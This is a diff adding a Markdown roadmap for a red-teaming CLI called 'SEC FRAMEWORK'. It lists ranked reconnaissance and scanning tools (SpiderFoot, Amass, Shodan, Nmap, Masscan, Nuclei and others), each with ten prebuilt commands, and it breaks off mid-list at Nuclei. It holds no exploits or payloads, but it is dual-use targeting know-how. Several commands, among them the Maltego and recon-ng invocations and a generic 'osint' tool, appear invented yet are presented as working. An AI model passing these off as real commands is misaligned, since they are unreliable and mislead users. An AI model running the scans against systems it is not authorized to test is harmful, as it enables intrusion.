@@ -1,0 +1,4187 @@
+# SEC FRAMEWORK - Red Teaming Development Roadmap
+
+## Project: **SEC FRAMEWORK** (Security Evaluation & Control Framework)
+
+---
+
+# COMPLETE RED TEAMING ROADMAP (10 PHASES)
+
+## Framework Overview
+
+The SEC FRAMEWORK is a menu-driven CLI tool where each command must be complete and self-contained. All tools execute from the command line with pre-built, complete commands. The framework follows the MITRE ATT&CK adversary lifecycle, from reconnaissance to achieving defined objectives.
+
+**Note on Tools:** The commands below utilize tools that are industry standards for red teaming and penetration testing. Many of these tools require proper authorization and should only be used on systems you own or have explicit permission to test. The framework is designed for authorized security operations only.
+
+---
+
+## PHASE 1: RECONNAISSANCE (★★★★★)
+
+**Description:** External intelligence gathering without direct engagement. Open-source intelligence (OSINT) forms the foundation for all subsequent attack vectors.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. SpiderFoot
+**Description:** Automated OSINT tool integrating multiple modules for comprehensive intelligence gathering.
+
+**Why Best:** One-command automation system with broad intelligence gathering capabilities. Integrates with 100+ modules for passive data collection.
+
+**Mods (Commands):**
+```bash
+# 1. Scan domain with all modules
+spiderfoot -s <DOMAIN> -o /opt/sec/output/spiderfoot_domain_<TIMESTAMP>.csv
+
+# 2. Run specific modules for targeted recon
+spiderfoot -s <DOMAIN> -m sfp_email,sfp_dnsresolve,sfp_subdomain -o /opt/sec/output/spiderfoot_modules_<TIMESTAMP>.csv
+
+# 3. JSON output for integration
+spiderfoot -s <DOMAIN> -o /opt/sec/output/spiderfoot_json_<TIMESTAMP>.json
+
+# 4. Filter results by type (email, domain, IP)
+spiderfoot -s <DOMAIN> -F EMAIL_ADDR -o /opt/sec/output/spiderfoot_filter_<TIMESTAMP>.csv
+
+# 5. Scan network range
+spiderfoot -s <IP_CIDR> -o /opt/sec/output/spiderfoot_network_<TIMESTAMP>.csv
+
+# 6. Scan email address for breaches
+spiderfoot -s <EMAIL> -o /opt/sec/output/spiderfoot_email_<TIMESTAMP>.csv
+
+# 7. Use threat intelligence feeds
+spiderfoot -s <DOMAIN> -T -o /opt/sec/output/spiderfoot_threat_<TIMESTAMP>.csv
+
+# 8. Debug mode for troubleshooting
+spiderfoot --debug -s <DOMAIN> -o /opt/sec/output/spiderfoot_debug_<TIMESTAMP>.csv
+
+# 9. Custom module directory
+spiderfoot -m /opt/sec/modules -s <DOMAIN> -o /opt/sec/output/spiderfoot_custom_<TIMESTAMP>.csv
+
+# 10. Verbose output with all details
+spiderfoot -v -s <DOMAIN> -o /opt/sec/output/spiderfoot_verbose_<TIMESTAMP>.csv
+```
+
+---
+
+#### 2. Amass
+**Description:** OWASP project for in-depth subdomain enumeration via certificate logs, DNS, and scraping.
+
+**Why Best:** Unmatched breadth of data sources for discovering the complete external attack surface. Uses 30+ data sources.
+
+**Mods (Commands):**
+```bash
+# 1. Passive subdomain enumeration
+amass enum -passive -d <DOMAIN> -o /opt/sec/output/amass_passive_<TIMESTAMP>.txt
+
+# 2. Active enumeration with DNS resolution
+amass enum -active -d <DOMAIN> -o /opt/sec/output/amass_active_<TIMESTAMP>.txt
+
+# 3. Bruteforce subdomains with wordlist
+amass enum -d <DOMAIN> -brute -w /opt/sec/wordlists/subdomains.txt -o /opt/sec/output/amass_brute_<TIMESTAMP>.txt
+
+# 4. Find related domains via WHOIS
+amass intel -whois -d <DOMAIN> -o /opt/sec/output/amass_whois_<TIMESTAMP>.txt
+
+# 5. Generate graph of findings (visualization)
+amass viz -d <DOMAIN> -o /opt/sec/output/amass_graph_<TIMESTAMP>.dot
+
+# 6. JSON output for automation
+amass enum -passive -d <DOMAIN> -json /opt/sec/output/amass_json_<TIMESTAMP>.json
+
+# 7. Probe specific ports during enumeration
+amass enum -d <DOMAIN> -p 80,443,8080,8443 -o /opt/sec/output/amass_ports_<TIMESTAMP>.txt
+
+# 8. Use custom DNS resolvers
+amass enum -d <DOMAIN> -r /opt/sec/configs/resolvers.txt -o /opt/sec/output/amass_resolvers_<TIMESTAMP>.txt
+
+# 9. Track project for continuous monitoring
+amass track -name <PROJECT_NAME> -d <DOMAIN> -o /opt/sec/output/amass_track_<TIMESTAMP>.txt
+
+# 10. Silent mode (no progress output)
+amass enum -passive -d <DOMAIN> -silent -o /opt/sec/output/amass_silent_<TIMESTAMP>.txt
+```
+
+---
+
+#### 3. theHarvester
+**Description:** OSINT tool gathering emails, subdomains, and employee names from public sources.
+
+**Why Best:** Exceptionally fast email and domain enumeration with multiple source support (Google, Bing, LinkedIn, Shodan).
+
+**Mods (Commands):**
+```bash
+# 1. Gather emails from Google
+theHarvester -d <DOMAIN> -b google -f /opt/sec/output/theharvester_google_<TIMESTAMP>.html
+
+# 2. Gather employee names from LinkedIn
+theHarvester -d <DOMAIN> -b linkedin -f /opt/sec/output/theharvester_linkedin_<TIMESTAMP>.html
+
+# 3. Limit results from Bing (500 results)
+theHarvester -d <DOMAIN> -b bing -l 500 -f /opt/sec/output/theharvester_bing_<TIMESTAMP>.html
+
+# 4. Get host information from Shodan
+theHarvester -d <DOMAIN> -b shodan -f /opt/sec/output/theharvester_shodan_<TIMESTAMP>.html
+
+# 5. Use all sources for comprehensive results
+theHarvester -d <DOMAIN> -b all -f /opt/sec/output/theharvester_all_<TIMESTAMP>.html
+
+# 6. Perform DNS reverse lookup on results
+theHarvester -d <DOMAIN> -b yahoo -n -f /opt/sec/output/theharvester_reverse_<TIMESTAMP>.html
+
+# 7. Gather from Baidu search engine
+theHarvester -d <DOMAIN> -b baidu -f /opt/sec/output/theharvester_baidu_<TIMESTAMP>.html
+
+# 8. Use Dogpile search engine
+theHarvester -d <DOMAIN> -b dogpile -f /opt/sec/output/theharvester_dogpile_<TIMESTAMP>.html
+
+# 9. Find Twitter accounts
+theHarvester -d <DOMAIN> -b twitter -f /opt/sec/output/theharvester_twitter_<TIMESTAMP>.html
+
+# 10. All sources with Shodan host discovery
+theHarvester -d <DOMAIN> -b all -s -f /opt/sec/output/theharvester_all_shodan_<TIMESTAMP>.html
+```
+
+---
+
+#### 4. Subfinder
+**Description:** Fast passive subdomain enumeration tool using APIs from various sources.
+
+**Why Best:** Speed and passive collection make it perfect for quick subdomain discovery. Uses 15+ sources.
+
+**Mods (Commands):**
+```bash
+# 1. Basic subdomain enumeration
+subfinder -d <DOMAIN> -o /opt/sec/output/subfinder_basic_<TIMESTAMP>.txt
+
+# 2. Use all available sources
+subfinder -d <DOMAIN> -all -o /opt/sec/output/subfinder_all_<TIMESTAMP>.txt
+
+# 3. Only show resolving subdomains
+subfinder -d <DOMAIN> -nW -o /opt/sec/output/subfinder_resolving_<TIMESTAMP>.txt
+
+# 4. Include IP addresses in output
+subfinder -d <DOMAIN> -oI -o /opt/sec/output/subfinder_ip_<TIMESTAMP>.txt
+
+# 5. Use custom provider config
+subfinder -d <DOMAIN> -pc /opt/sec/configs/provider_config.yaml -o /opt/sec/output/subfinder_custom_<TIMESTAMP>.txt
+
+# 6. Silent mode (no banner/progress)
+subfinder -d <DOMAIN> -silent -o /opt/sec/output/subfinder_silent_<TIMESTAMP>.txt
+
+# 7. JSON output for automation
+subfinder -d <DOMAIN> -json -o /opt/sec/output/subfinder_json_<TIMESTAMP>.json
+
+# 8. Set threads for speed
+subfinder -d <DOMAIN> -t 50 -o /opt/sec/output/subfinder_threads_<TIMESTAMP>.txt
+
+# 9. Use custom DNS resolvers
+subfinder -d <DOMAIN> -r /opt/sec/configs/resolvers.txt -o /opt/sec/output/subfinder_resolvers_<TIMESTAMP>.txt
+
+# 10. Recursive subdomain enumeration
+subfinder -d <DOMAIN> -recursive -o /opt/sec/output/subfinder_recursive_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. Shodan CLI
+**Description:** Command-line interface for Shodan, the search engine for internet-connected devices.
+
+**Why Best:** Allows querying of historical and current data about target infrastructure without touching the target directly.
+
+**Mods (Commands):**
+```bash
+# 1. Get all information on specific IP
+shodan host <IP_ADDRESS> > /opt/sec/output/shodan_host_<TIMESTAMP>.txt
+
+# 2. Search Shodan database for target-specific queries
+shodan search "<SEARCH_QUERY>" --limit 100 --fields ip_str,port,org,hostnames > /opt/sec/output/shodan_search_<TIMESTAMP>.txt
+
+# 3. Get IPs associated with domain
+shodan domain <DOMAIN> > /opt/sec/output/shodan_domain_<TIMESTAMP>.txt
+
+# 4. Find SSL certificates for domain
+shodan search "ssl.cert.subject.CN:<DOMAIN>" --fields ip_str,port,ssl.cert.subject.CN > /opt/sec/output/shodan_cert_<TIMESTAMP>.txt
+
+# 5. Find devices with hostname matching domain
+shodan search "hostname:<DOMAIN>" --fields ip_str,port,hostnames > /opt/sec/output/shodan_hostname_<TIMESTAMP>.txt
+
+# 6. Download results for offline analysis
+shodan download /opt/sec/output/shodan_download_<TIMESTAMP> "<SEARCH_QUERY>"
+
+# 7. Parse downloaded data to extract fields
+shodan parse /opt/sec/output/shodan_download_<TIMESTAMP>.json.gz --fields ip_str,port,org > /opt/sec/output/shodan_parsed_<TIMESTAMP>.txt
+
+# 8. Create Shodan alert for continuous monitoring
+shodan alert "<ALERT_NAME>" "<SEARCH_QUERY>" > /opt/sec/output/shodan_alert_<TIMESTAMP>.txt
+
+# 9. Show plan details and API usage
+shodan info > /opt/sec/output/shodan_info_<TIMESTAMP>.txt
+
+# 10. Search with limit and save to file
+shodan search "<SEARCH_QUERY>" --limit 1000 --fields ip_str,port,org > /opt/sec/output/shodan_limited_<TIMESTAMP>.txt
+```
+
+---
+
+#### 6. DNSrecon
+**Description:** Powerful DNS enumeration script with zone transfer and brute-force capabilities.
+
+**Why Best:** Comprehensive DNS misconfiguration detection often leading to information disclosure. Supports all record types.
+
+**Mods (Commands):**
+```bash
+# 1. Standard enumeration of common records
+dnsrecon -d <DOMAIN> -o /opt/sec/output/dnsrecon_std_<TIMESTAMP>.txt
+
+# 2. Test for DNS zone transfer vulnerability
+dnsrecon -d <DOMAIN> -t axfr -o /opt/sec/output/dnsrecon_axfr_<TIMESTAMP>.txt
+
+# 3. Bruteforce subdomains with wordlist
+dnsrecon -d <DOMAIN> -D /opt/sec/wordlists/subdomains.txt -t brt -o /opt/sec/output/dnsrecon_brute_<TIMESTAMP>.txt
+
+# 4. Enumerate SRV records for services
+dnsrecon -d <DOMAIN> -t srv -o /opt/sec/output/dnsrecon_srv_<TIMESTAMP>.txt
+
+# 5. Query Google for subdomains
+dnsrecon -d <DOMAIN> -t goo -o /opt/sec/output/dnsrecon_google_<TIMESTAMP>.txt
+
+# 6. Query Bing for subdomains
+dnsrecon -d <DOMAIN> -t bing -o /opt/sec/output/dnsrecon_bing_<TIMESTAMP>.txt
+
+# 7. Check for DNSSEC signatures
+dnsrecon -d <DOMAIN> -t sig -o /opt/sec/output/dnsrecon_sig_<TIMESTAMP>.txt
+
+# 8. Perform reverse lookup on IP range
+dnsrecon -d <DOMAIN> -t rvs -r <IP_CIDR> -o /opt/sec/output/dnsrecon_reverse_<TIMESTAMP>.txt
+
+# 9. Save output in XML format
+dnsrecon -d <DOMAIN> --xml /opt/sec/output/dnsrecon_<TIMESTAMP>.xml
+
+# 10. Save output in CSV format
+dnsrecon -d <DOMAIN> -c /opt/sec/output/dnsrecon_<TIMESTAMP>.csv
+```
+
+---
+
+#### 7. WhatWeb
+**Description:** Web scanner identifying technologies used by websites (CMS, libraries, servers).
+
+**Why Best:** Quick fingerprint of web server technology stack for targeting.
+
+**Mods (Commands):**
+```bash
+# 1. Basic fingerprinting
+whatweb <DOMAIN> --log-json=/opt/sec/output/whatweb_basic_<TIMESTAMP>.json
+
+# 2. Set aggressiveness level 3 (more thorough)
+whatweb <DOMAIN> -a 3 --log-json=/opt/sec/output/whatweb_aggressive_<TIMESTAMP>.json
+
+# 3. List all available plugins
+whatweb -l > /opt/sec/output/whatweb_plugins_<TIMESTAMP>.txt
+
+# 4. Use specific plugins only
+whatweb <DOMAIN> -p <PLUGIN_LIST> --log-json=/opt/sec/output/whatweb_specific_<TIMESTAMP>.json
+
+# 5. Save output in JSON format
+whatweb <DOMAIN> --log-json=/opt/sec/output/whatweb_json_<TIMESTAMP>.json
+
+# 6. Save output in XML format
+whatweb <DOMAIN> --log-xml=/opt/sec/output/whatweb_xml_<TIMESTAMP>.xml
+
+# 7. Use custom User-Agent string
+whatweb <DOMAIN> -u "<USER_AGENT>" --log-json=/opt/sec/output/whatweb_ua_<TIMESTAMP>.json
+
+# 8. Scan multiple IPs and save as HTML
+whatweb -i /opt/sec/inputs/<IP_LIST> --log-html=/opt/sec/output/whatweb_multi_<TIMESTAMP>.html
+
+# 9. Suppress error messages
+whatweb <DOMAIN> -no-errors --log-json=/opt/sec/output/whatweb_quiet_<TIMESTAMP>.json
+
+# 10. Verbose output with more details
+whatweb <DOMAIN> -v --log-json=/opt/sec/output/whatweb_verbose_<TIMESTAMP>.json
+```
+
+---
+
+#### 8. Recon-ng
+**Description:** Full-featured web reconnaissance framework with module-like interface.
+
+**Why Best:** Structured and extensible environment for managing OSINT workflows.
+
+**Mods (Commands):**
+```bash
+# 1. Run Google site web module
+recon-ng -m recon/domains-hosts/google_site_web -O DOMAIN=<DOMAIN> --no-analytics -R /opt/sec/output/reconng_google_<TIMESTAMP>.csv
+
+# 2. Bruteforce hosts with wordlist
+recon-ng -m recon/domains-hosts/brute_hosts -O DOMAIN=<DOMAIN> --no-analytics -R /opt/sec/output/reconng_brute_<TIMESTAMP>.csv
+
+# 3. Check HIBP for domain breaches
+recon-ng -m recon/contacts-credentials/hibp_breach -O EMAIL=<EMAIL> --no-analytics -R /opt/sec/output/reconng_hibp_<TIMESTAMP>.csv
+
+# 4. Generate HTML report
+recon-ng -m reporting/html -O FILENAME=/opt/sec/output/reconng_report_<TIMESTAMP>.html --no-analytics
+
+# 5. Generate JSON report
+recon-ng -m reporting/json -O FILENAME=/opt/sec/output/reconng_report_<TIMESTAMP>.json --no-analytics
+
+# 6. Query ip-api.com service
+recon-ng -m recon/domains-hosts/ip_crypto -O DOMAIN=<DOMAIN> --no-analytics -R /opt/sec/output/reconng_ip_<TIMESTAMP>.csv
+
+# 7. Query XSSed for domain
+recon-ng -m recon/domains-vulnerabilities/xssed -O DOMAIN=<DOMAIN> --no-analytics -R /opt/sec/output/reconng_xssed_<TIMESTAMP>.csv
+
+# 8. Create workspace with domain scan
+recon-ng -w <WORKSPACE> -m recon/domains-hosts/google_site_web -O DOMAIN=<DOMAIN> --no-analytics -R /opt/sec/output/reconng_workspace_<TIMESTAMP>.csv
+
+# 9. Debug mode
+recon-ng --debug -m recon/domains-hosts/google_site_web -O DOMAIN=<DOMAIN> --no-analytics -R /opt/sec/output/reconng_debug_<TIMESTAMP>.csv
+
+# 10. Custom modules directory
+recon-ng --module-path /opt/sec/modules -m recon/domains-hosts/google_site_web -O DOMAIN=<DOMAIN> --no-analytics -R /opt/sec/output/reconng_custom_<TIMESTAMP>.csv
+```
+
+---
+
+#### 9. OSINT CLI
+**Description:** Command-line tool for various OSINT techniques including username enumeration, email validation, and data breach checking.
+
+**Why Best:** Comprehensive passive intelligence gathering across multiple platforms.
+
+**Mods (Commands):**
+```bash
+# 1. Check email for data breaches
+osint -e <EMAIL> -o /opt/sec/output/osint_email_<TIMESTAMP>.txt
+
+# 2. Search username across platforms
+osint -u <USERNAME> -o /opt/sec/output/osint_username_<TIMESTAMP>.txt
+
+# 3. DNS enumeration
+osint -d <DOMAIN> -t dns -o /opt/sec/output/osint_dns_<TIMESTAMP>.txt
+
+# 4. WHOIS lookup
+osint -d <DOMAIN> -t whois -o /opt/sec/output/osint_whois_<TIMESTAMP>.txt
+
+# 5. Reverse IP lookup
+osint -i <IP_ADDRESS> -t reverse -o /opt/sec/output/osint_reverse_<TIMESTAMP>.txt
+
+# 6. Social media footprint
+osint -u <USERNAME> -t social -o /opt/sec/output/osint_social_<TIMESTAMP>.txt
+
+# 7. Google dorks
+osint -d <DOMAIN> -t dork -o /opt/sec/output/osint_dorks_<TIMESTAMP>.txt
+
+# 8. Shodan query
+osint -i <IP_ADDRESS> -t shodan -o /opt/sec/output/osint_shodan_<TIMESTAMP>.txt
+
+# 9. Threat intel feeds
+osint -d <DOMAIN> -t threat -o /opt/sec/output/osint_threat_<TIMESTAMP>.txt
+
+# 10. JSON output
+osint -d <DOMAIN> -t all -f json -o /opt/sec/output/osint_json_<TIMESTAMP>.json
+```
+
+---
+
+#### 10. Maltego CLI
+**Description:** Data mining tool transforming small info into broader relationship graphs.
+
+**Why Best:** Connects disparate OSINT data points into relationship pictures.
+
+**Mods (Commands):**
+```bash
+# 1. Load existing graph
+maltego -g /opt/sec/inputs/<GRAPH_FILE>.mtgx -o /opt/sec/output/maltego_loaded_<TIMESTAMP>.mtgx
+
+# 2. Run transform from CLI
+maltego -e <ENTITY_TYPE> <VALUE> -o /opt/sec/output/maltego_transform_<TIMESTAMP>.mtgx
+
+# 3. Specify transform to run
+maltego -t <TRANSFORM_NAME> -e <ENTITY_TYPE> <VALUE> -o /opt/sec/output/maltego_specific_<TIMESTAMP>.mtgx
+
+# 4. Import and export graphs
+maltego -i /opt/sec/inputs/<FILE>.mtgx -o /opt/sec/output/maltego_import_<TIMESTAMP>.mtgx
+
+# 5. Headless mode for automation
+maltego --headless -e <ENTITY> <VALUE> -o /opt/sec/output/maltego_headless_<TIMESTAMP>.mtgx
+
+# 6. Run Maltego machine
+maltego -m <MACHINE_NAME> -e <ENTITY> <VALUE> -o /opt/sec/output/maltego_machine_<TIMESTAMP>.mtgx
+
+# 7. Custom configuration file
+maltego -c /opt/sec/configs/maltego_config.conf -e <ENTITY> <VALUE> -o /opt/sec/output/maltego_config_<TIMESTAMP>.mtgx
+
+# 8. Set property for transform
+maltego -p <PROPERTY_KEY> <VALUE> -e <ENTITY> <VALUE> -o /opt/sec/output/maltego_property_<TIMESTAMP>.mtgx
+
+# 9. Show version and available modules
+maltego -v > /opt/sec/output/maltego_version_<TIMESTAMP>.txt
+
+# 10. Continue operation on errors
+maltego -k -e <ENTITY> <VALUE> -o /opt/sec/output/maltego_continue_<TIMESTAMP>.mtgx
+```
+
+---
+
+## PHASE 2: ATTACK SURFACE MAPPING (★★★★★)
+
+**Description:** Active probing of discovered assets to identify live hosts, open ports, running services, and potential vulnerabilities.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. Nmap
+**Description:** Industry standard for network discovery and security auditing, capable of detailed port scanning, version detection, and OS fingerprinting.
+
+**Why Best:** Fast, reliable, with powerful scripting engine (NSE) for vulnerability detection. Unmatched flexibility.
+
+**Mods (Commands):**
+```bash
+# 1. SYN scan, all ports, no ping, fast timing
+nmap -sS -Pn -p- -T4 <TARGET_IP> -oA /opt/sec/output/nmap_syn_<TIMESTAMP>
+
+# 2. Version and default script scan
+nmap -sV -sC -p <PORT_RANGE> <TARGET_IP> -oA /opt/sec/output/nmap_version_<TIMESTAMP>
+
+# 3. OS detection with aggressive guessing
+nmap -O --osscan-guess <TARGET_IP> -oA /opt/sec/output/nmap_os_<TIMESTAMP>
+
+# 4. Scan for known vulnerabilities
+nmap --script vuln <TARGET_IP> -oA /opt/sec/output/nmap_vuln_<TIMESTAMP>
+
+# 5. Run specific script on port
+nmap -p <PORT> --script <SCRIPT_NAME> <TARGET_IP> -oA /opt/sec/output/nmap_script_<TIMESTAMP>
+
+# 6. Discovery scan (ping sweep)
+nmap -sn <IP_CIDR> -oA /opt/sec/output/nmap_ping_<TIMESTAMP>
+
+# 7. Grabbing banners and grepable output
+nmap -p 80,443,8080,8443 -T4 -A -oG /opt/sec/output/nmap_banner_<TIMESTAMP>.txt <IP_RANGE>
+
+# 8. Enumerate DNS SRV records
+nmap --script dns-srv-enum --script-args domain=<DOMAIN> <DNS_SERVER_IP> -oA /opt/sec/output/nmap_dns_<TIMESTAMP>
+
+# 9. UDP scan for common services
+nmap -sU -p 161,162,500,4500,53,123,67,68 <TARGET_IP> -oA /opt/sec/output/nmap_udp_<TIMESTAMP>
+
+# 10. Enumerate SMB shares and users
+nmap -p 445 --script smb-enum-shares,smb-enum-users <TARGET_IP> -oA /opt/sec/output/nmap_smb_<TIMESTAMP>
+```
+
+---
+
+#### 2. Masscan
+**Description:** High-speed asynchronous port scanner for scanning the entire internet or huge networks.
+
+**Why Best:** Exceptionally fast for mapping large external attack surface. Can scan entire internet in minutes.
+
+**Mods (Commands):**
+```bash
+# 1. Grepable output format
+masscan -p80,443,8080,8443 -oG /opt/sec/output/masscan_grep_<TIMESTAMP>.txt <IP_CIDR>
+
+# 2. Scan all ports, JSON output
+masscan -p1-65535 -oJ /opt/sec/output/masscan_json_<TIMESTAMP>.json <TARGET_IP>
+
+# 3. Set specific scan rate (packets per second)
+masscan -p<PORT_RANGE> --rate=10000 -oG /opt/sec/output/masscan_rate_<TIMESTAMP>.txt <IP_RANGE>
+
+# 4. Save output to binary file
+masscan -p0-65535 --banners -oB /opt/sec/output/masscan_binary_<TIMESTAMP>.bin <TARGET_IP>
+
+# 5. List format output
+masscan -p<PORT_RANGE> -oL /opt/sec/output/masscan_list_<TIMESTAMP>.txt <IP_RANGE>
+
+# 6. XML output
+masscan -p<PORT_RANGE> -oX /opt/sec/output/masscan_xml_<TIMESTAMP>.xml <IP_RANGE>
+
+# 7. Wait 0 seconds after finishing scan
+masscan -p80,443,8080 --wait 0 -oG /opt/sec/output/masscan_nowait_<TIMESTAMP>.txt <IP_CIDR>
+
+# 8. Set source port for scan
+masscan -p<PORT_RANGE> --source-port <PORT> -oG /opt/sec/output/masscan_source_<TIMESTAMP>.txt <TARGET>
+
+# 9. Exclude specific IPs
+masscan -p<PORT_RANGE> --exclude <IP> -oG /opt/sec/output/masscan_exclude_<TIMESTAMP>.txt <IP_RANGE>
+
+# 10. Scan with interface specified
+masscan -p<PORT_RANGE> -e <INTERFACE> -oG /opt/sec/output/masscan_interface_<TIMESTAMP>.txt <IP_RANGE>
+```
+
+---
+
+#### 3. RustScan
+**Description:** Fast port scanner using Rust with intelligent port detection and Nmap integration.
+
+**Why Best:** Extremely fast with automatic Nmap integration for detailed scanning.
+
+**Mods (Commands):**
+```bash
+# 1. Basic scan
+rustscan -a <TARGET_IP> -o /opt/sec/output/rustscan_basic_<TIMESTAMP>.txt
+
+# 2. Scan specific ports
+rustscan -a <TARGET_IP> -p 80,443,22,21,25,53 -o /opt/sec/output/rustscan_ports_<TIMESTAMP>.txt
+
+# 3. Scan all ports
+rustscan -a <TARGET_IP> -p - -o /opt/sec/output/rustscan_all_<TIMESTAMP>.txt
+
+# 4. JSON output
+rustscan -a <TARGET_IP> -o /opt/sec/output/rustscan_json_<TIMESTAMP>.json
+
+# 5. Scan with batch size
+rustscan -a <TARGET_IP> -b 1000 -o /opt/sec/output/rustscan_batch_<TIMESTAMP>.txt
+
+# 6. Scan with timeout (ms)
+rustscan -a <TARGET_IP> -t 2000 -o /opt/sec/output/rustscan_timeout_<TIMESTAMP>.txt
+
+# 7. Scan with CIDR
+rustscan -a <IP_CIDR> -o /opt/sec/output/rustscan_cidr_<TIMESTAMP>.txt
+
+# 8. Scan with Nmap integration
+rustscan -a <TARGET_IP> -o /opt/sec/output/rustscan_nmap_<TIMESTAMP>.txt -- -A -sC
+
+# 9. Scan with specific interface
+rustscan -a <TARGET_IP> -e <INTERFACE> -o /opt/sec/output/rustscan_interface_<TIMESTAMP>.txt
+
+# 10. Scan with max retries
+rustscan -a <TARGET_IP> --max-retries 3 -o /opt/sec/output/rustscan_retry_<TIMESTAMP>.txt
+```
+
+---
+
+#### 4. Naabu
+**Description:** Fast port scanner written in Go with SYN scanning and service discovery.
+
+**Why Best:** Lightweight and efficient for quick port scanning.
+
+**Mods (Commands):**
+```bash
+# 1. Basic port scan
+naabu -host <TARGET_IP> -o /opt/sec/output/naabu_basic_<TIMESTAMP>.txt
+
+# 2. Scan specific ports
+naabu -host <TARGET_IP> -p 80,443,8080,8443,22,21,25,53,110,143,993,995 -o /opt/sec/output/naabu_ports_<TIMESTAMP>.txt
+
+# 3. Scan all ports with rate
+naabu -host <TARGET_IP> -p - -rate 1000 -o /opt/sec/output/naabu_all_<TIMESTAMP>.txt
+
+# 4. JSON output
+naabu -host <TARGET_IP> -json -o /opt/sec/output/naabu_json_<TIMESTAMP>.json
+
+# 5. Scan with CIDR
+naabu -host <IP_CIDR> -o /opt/sec/output/naabu_cidr_<TIMESTAMP>.txt
+
+# 6. Use custom interface
+naabu -host <TARGET_IP> -interface <INTERFACE> -o /opt/sec/output/naabu_interface_<TIMESTAMP>.txt
+
+# 7. Scan with specific source port
+naabu -host <TARGET_IP> -source-port <PORT> -o /opt/sec/output/naabu_source_<TIMESTAMP>.txt
+
+# 8. Silent mode (only open ports)
+naabu -host <TARGET_IP> -silent -o /opt/sec/output/naabu_silent_<TIMESTAMP>.txt
+
+# 9. Scan with retries
+naabu -host <TARGET_IP> -retries 3 -o /opt/sec/output/naabu_retry_<TIMESTAMP>.txt
+
+# 10. Scan with timeout
+naabu -host <TARGET_IP> -timeout 3s -o /opt/sec/output/naabu_timeout_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. HTTPX
+**Description:** Fast HTTP/S probe tool for discovering live hosts, technologies, and metadata.
+
+**Why Best:** Blazing fast with comprehensive HTTP fingerprinting capabilities.
+
+**Mods (Commands):**
+```bash
+# 1. Live Host Detection with status code and title
+httpx -u <URL> -silent -sc -title -cl -o /opt/sec/output/httpx_live_<TIMESTAMP>.txt
+
+# 2. Technology Fingerprinting
+httpx -u <URL> -silent -tech-detect -o /opt/sec/output/httpx_tech_<TIMESTAMP>.txt
+
+# 3. CDN & Server Detection
+httpx -u <URL> -silent -cdn -server -o /opt/sec/output/httpx_cdn_<TIMESTAMP>.txt
+
+# 4. TLS & CSP Probe
+httpx -u <URL> -silent -tls-probe -csp-probe -o /opt/sec/output/httpx_tls_<TIMESTAMP>.txt
+
+# 5. JARM Fingerprint
+httpx -u <URL> -silent -jarm -o /opt/sec/output/httpx_jarm_<TIMESTAMP>.txt
+
+# 6. Favicon Hash Detection
+httpx -u <URL> -silent -favicon -o /opt/sec/output/httpx_favicon_<TIMESTAMP>.txt
+
+# 7. Screenshot Capture
+httpx -u <URL> -silent -screenshot -screenshot-path /opt/sec/output/httpx_screenshot_<TIMESTAMP>.png
+
+# 8. Response Hash Check
+httpx -u <URL> -silent -hash -o /opt/sec/output/httpx_hash_<TIMESTAMP>.txt
+
+# 9. Custom Port Probe
+httpx -u <URL> -silent -p 80,443,8080,8443,3000,5000 -o /opt/sec/output/httpx_ports_<TIMESTAMP>.txt
+
+# 10. JSON Full Metadata
+httpx -u <URL> -silent -json -o /opt/sec/output/httpx_json_<TIMESTAMP>.json
+```
+
+---
+
+#### 6. DNSX
+**Description:** Fast DNS resolution and validation tool.
+
+**Why Best:** Efficient DNS resolution for large subdomain lists.
+
+**Mods (Commands):**
+```bash
+# 1. Resolve subdomains
+dnsx -l /opt/sec/inputs/<SUBDOMAIN_LIST> -o /opt/sec/output/dnsx_resolve_<TIMESTAMP>.txt
+
+# 2. Check wildcard DNS
+dnsx -l /opt/sec/inputs/<SUBDOMAIN_LIST> -wildcard -o /opt/sec/output/dnsx_wildcard_<TIMESTAMP>.txt
+
+# 3. JSON output
+dnsx -l /opt/sec/inputs/<SUBDOMAIN_LIST> -json -o /opt/sec/output/dnsx_json_<TIMESTAMP>.json
+
+# 4. Use custom resolvers
+dnsx -l /opt/sec/inputs/<SUBDOMAIN_LIST> -r /opt/sec/configs/resolvers.txt -o /opt/sec/output/dnsx_resolvers_<TIMESTAMP>.txt
+
+# 5. Perform A record lookup
+dnsx -l /opt/sec/inputs/<SUBDOMAIN_LIST> -a -o /opt/sec/output/dnsx_a_<TIMESTAMP>.txt
+
+# 6. Perform CNAME lookup
+dnsx -l /opt/sec/inputs/<SUBDOMAIN_LIST> -cname -o /opt/sec/output/dnsx_cname_<TIMESTAMP>.txt
+
+# 7. Perform MX lookup
+dnsx -l /opt/sec/inputs/<SUBDOMAIN_LIST> -mx -o /opt/sec/output/dnsx_mx_<TIMESTAMP>.txt
+
+# 8. Perform TXT lookup
+dnsx -l /opt/sec/inputs/<SUBDOMAIN_LIST> -txt -o /opt/sec/output/dnsx_txt_<TIMESTAMP>.txt
+
+# 9. Perform NS lookup
+dnsx -l /opt/sec/inputs/<SUBDOMAIN_LIST> -ns -o /opt/sec/output/dnsx_ns_<TIMESTAMP>.txt
+
+# 10. Perform reverse DNS
+dnsx -l /opt/sec/inputs/<IP_LIST> -ptr -o /opt/sec/output/dnsx_ptr_<TIMESTAMP>.txt
+```
+
+---
+
+#### 7. Nuclei
+**Description:** Fast, template-based vulnerability scanner with community-maintained templates.
+
+**Why Best:** Automates detection of thousands of known vulnerabilities, misconfigurations, and exposed information.
+
+**Mods (Commands):**
+```bash
+# 1. Basic scan of single URL
+nuclei -u <URL> -o /opt/sec/output/nuclei_basic_<TIMESTAMP>.txt
+
+# 2. Scan from list of targets
+nuclei -l /opt/sec/inputs/<URL_LIST> -o /opt/sec/output/nuclei_list_<TIMESTAMP>.txt
+
+# 3. Use specific templates (CVEs only)
+nuclei -u <URL> -t /opt/sec/templates/cves/ -o /opt/sec/output/nuclei_cves_<TIMESTAMP>.txt
+
+# 4. Filter by severity (critical, high)
+nuclei -u <URL> -severity critical,high -o /opt/sec/output/nuclei_severe_<TIMESTAMP>.txt
+
+# 5. JSON output for automation
+nuclei -u <URL> -json -o /opt/sec/output/nuclei_json_<TIMESTAMP>.json
+
+# 6. Show stats during scan
+nuclei -u <URL> -stats -o /opt/sec/output/nuclei_stats_<TIMESTAMP>.txt
+
+# 7. Use headless browser for advanced checks
+nuclei -u <URL> -headless -o /opt/sec/output/nuclei_headless_<TIMESTAMP>.txt
+
+# 8. Set timeout (seconds)
